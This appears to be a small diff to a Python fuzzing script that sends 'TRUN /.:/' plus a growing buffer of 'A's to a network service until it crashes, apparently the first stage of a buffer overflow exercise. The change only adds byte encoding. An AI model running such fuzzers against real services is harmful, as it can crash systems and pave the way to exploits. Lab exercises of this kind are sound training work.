@@ -14,12 +14,14 @@ while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
 
-        s.send(("TRUN /.:/" + buffer))
+        data = "TRUN /.:/" + buffer
+
+        s.send((data.encode()))
         s.close()
 
         sleep(1)
-
         buffer += "A" * 100
+
     except:
         print(f"Fuzzing crashed at {len(buffer)} bytes")
         sys.exit()
